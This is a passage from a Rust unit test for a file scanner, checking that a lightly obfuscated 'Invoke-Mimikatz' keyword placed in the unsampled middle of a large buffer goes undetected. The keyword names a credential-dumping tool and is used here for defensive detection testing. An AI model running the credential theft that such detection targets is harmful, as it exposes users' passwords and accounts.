        let mut data = vec![b'a'; HEAD + TAIL + 4 * 1024 * 1024];
        let mid = HEAD + 1024;
        let needle = x("invoke-mimi~katz   ok ");
        data[mid..mid + needle.len()].copy_from_slice(needle.as_bytes());
        assert!(analyze(FileKind::Text, &data).is_empty(), "the unsampled middle is not searched");
    }
}
